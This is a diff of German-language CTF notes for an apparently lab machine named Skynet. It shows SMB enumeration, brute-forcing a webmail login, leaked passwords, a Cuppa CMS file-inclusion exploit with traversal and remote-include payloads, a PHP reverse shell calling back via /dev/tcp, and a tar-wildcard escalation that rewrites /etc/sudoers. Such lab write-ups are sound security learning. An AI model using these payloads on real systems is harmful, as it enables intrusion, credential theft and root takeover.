@@ -48,6 +48,7 @@ Host script results:
 ```
 
 -> Intressante Windows Version 6.1 -> Win 7 -> vllt eternal Blue
+-> Samba offen -> vllt infos
 
 ## Gobuster 
 
@@ -64,3 +65,195 @@ Starting gobuster in directory enumeration mode
 
 ```
 
+-> Webmail unter /squirrelmail
+# Enumeration
+
+## Samba 
+
+enum4linux
+```
+ ========================== 
+|    Target Information    |
+ ========================== 
+Target ........... 10.10.17.9
+RID Range ........ 500-550,1000-1050
+Username ......... ''
+Password ......... ''
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+
+
+ ================================================== 
+|    Enumerating Workgroup/Domain on 10.10.17.9    |
+ ================================================== 
+[+] Got domain/workgroup name: WORKGROUP
+
+ =================================== 
+|    Session Check on 10.10.17.9    |
+ =================================== 
+[+] Server 10.10.17.9 allows sessions using username '', password ''
+
+ ========================================= 
+|    Getting domain SID for 10.10.17.9    |
+ ========================================= 
+Domain Name: WORKGROUP
+Domain Sid: (NULL SID)
+[+] Can't determine if host is part of domain or part of a workgroup
+
+ =========================== 
+|    Users on 10.10.17.9    |
+ =========================== 
+index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: milesdyson	Name: 	Desc: 
+
+user:[milesdyson] rid:[0x3e8]
+enum4linux complete on Mon Oct 13 08:18:36 2025
+
+```
+
+Schauen was für ordner anliegen
+
+```
+smbclient -L 10.10.17.9
+
+Password for [WORKGROUP\root]:
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	print$          Disk      Printer Drivers
+	anonymous       Disk      Skynet Anonymous Share
+	milesdyson      Disk      Miles Dyson Personal Share
+	IPC$            IPC       IPC Service (skynet server (Samba, Ubuntu))
+
+```
+Versuch auf "milesdyson" share zuzugreifen ohne erfolg
+
+Zugriff auf "Anonymous". Hier liegen 3 Log Datein die man sich laden kann. Kontrolle dieser, Log1 sieht fast aus wie eine Passwort liste -> vllt login möglich für Webmail
+
+Login via Burp Bruteforcen (ist halt am einfachsten wenn die Liste kurz ist)
+
+## PW und Nutzer Bekannt
+
+milesdyson
+cyborg007haloterminator
+
+# Enumeration der Webmails 
+
+-> Durchgehen der Mails 
+-> Intressante mail Samba Password Reset
+-> PW für Samba share 
+
+We have changed your smb password after system malfunction.
+Password: )s{A&2Z=F^n_E.B`
+
+-> Login auf dem milesdyson samba share 
+-> Durchschauen auf Infos -> Important.txt
+-> Inhalt: 1. Add features to beta CMS /45kra24zxs28v3yd
+
+
+
+# Exploiting erfolglos
+
+-> Verdacht aus NMAP das Eternal Blue vllt Funktionieren könnte 
+
+```
+[*] 10.10.17.9:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+[-] 10.10.17.9:445        - Host does NOT appear vulnerable.
+[*] 10.10.17.9:445        - Scanned 1 of 1 hosts (100% complete)
+[-] 10.10.17.9:445 - The target is not vulnerable.
+[*] Exploit completed, but no session was created.
+```
+
+# Enumeration 
+
+Da Eternal Blue nicht geklappt hat backtracking zu enumeration von /45kra24zxs28v3yd
+
+-> gefunden /administrator
+-> Dahinter liegt admin Portal vonCuppa CMS 
+-> Versuch mit bekannten creds anzumelden- Erfolglos 
+
+Schauen ob es vllt was bekanntes zum Exploiten gibt -> Erfolg
+
+```
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+ Exploit Title                                                                                                                                                                                  |  Path
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion                                                                                                                                 | php/webapps/25971.txt
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+Shellcodes: No Results
+```
+
+# Exploiting 
+
+```
+
+#####################################################
+DESCRIPTION
+#####################################################
+
+An attacker might include local or remote PHP files or read non-PHP files with this vulnerability. User tainted data is used when creating the file name that will be included into the current file. PHP code in this file will be evaluated, non-PHP code will be embedded to the output. This vulnerability can lead to full server compromise.
+
+http://target/cuppa/alerts/alertConfigField.php?urlConfig=[FI]
+
+#####################################################
+EXPLOIT
+#####################################################
+
+http://target/cuppa/alerts/alertConfigField.php?urlConfig=http://www.shell.com/shell.txt?
+http://target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
+
+Moreover, We could access Configuration.php source code via PHPStream 
+
+For Example:
+-----------------------------------------------------------------------------
+http://target/cuppa/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php
+
+```
+
+http://10.10.17.9/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
+
+->Test erfolgreich 
+
+Jetzt laden wir uns eine PHP Rev shell 
+
+```
+<?php  
+/**  
+* Plugin Name: Wordpress Reverse Shell  
+* Author: azkrath  
+*/  
+exec(“/bin/bash -c ‘bash -i >& /dev/tcp/10.10.17.176/4444 0>&1’”)  
+?>
+```
+
+und starten einen nc Listener und Python webserver
+
+```
+python3 -m http.server
+rlwrap nc -lvnp 4444
+```
+
+Jetzt müssen wir nur noch die anfrage anpassen
+
+http://10.10.17.9/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.10.17.176:8000/Desktop/rev.php
+
+und schon erhalten wir die Rev shell
+# Privilegien Eskallieren
+
+Checken der Sudo Rechte, SUID und Capability's -> ohne Erfolg 
+
+Checken der Cronjobs -> Interessantes Resultat 
+
+Jede Minute wird /home/milesdyson/backup das backup.sh Script aufgeführt. Beim durchlesen der Shell Datei kann man eine Wildcard sehen welche wir nutzen können 
+
+Das habe ich aber alleine nicht hinbekommen deshalb hier der Lösungsweg aus Writeup
+
+There were multiple methods to get root from this vulnerability, we decided to use it to grant the sudoers permission instead of getting another shell. So, we moved to the directory that is being backed up and then created another shell script by the name of pavan.sh and entered the command inside it using echo. Then we proceeded to enter the checkpoint that will run the shell command when the tar will be backing up the directory. Using the sudo -l command we saw that the sudoers entry has been made. We just use the sudo bash command to get the root shell. We read the root flag to conclude the machine.
+
+```
+cd /var/www/html
+echo 'echo "www-data ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > pavan.sh
+echo "/var/www/html" > "--checkpoint-action=exec=sh pavan.sh"
+echo "/var/www/html" > --checkpoint=1
+sudo -l
+sudo bash
+cat /root/root.txt
+```
